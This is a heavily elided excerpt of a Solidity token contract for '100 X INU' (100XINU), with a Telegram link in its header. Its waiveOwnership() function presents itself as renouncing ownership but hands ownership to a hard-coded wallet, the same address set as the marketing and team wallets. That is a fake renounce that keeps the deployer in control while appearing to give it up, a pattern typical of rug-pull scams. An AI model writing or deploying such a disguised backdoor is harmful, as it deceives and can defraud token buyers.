...
/**
Telegram : https://t.me/HundredInu
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xF9aB73EC87f2731fCb07A8682a99859ECB1B5E4B);
    }
...
contract HundredXINU is Context, IERC20, Ownable {
    ...
    string private _name = "100 X INU";
    string private _symbol = "100XINU";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0xF9aB73EC87f2731fCb07A8682a99859ECB1B5E4B);
    address payable private teamWalletAddress = payable(0xF9aB73EC87f2731fCb07A8682a99859ECB1B5E4B);
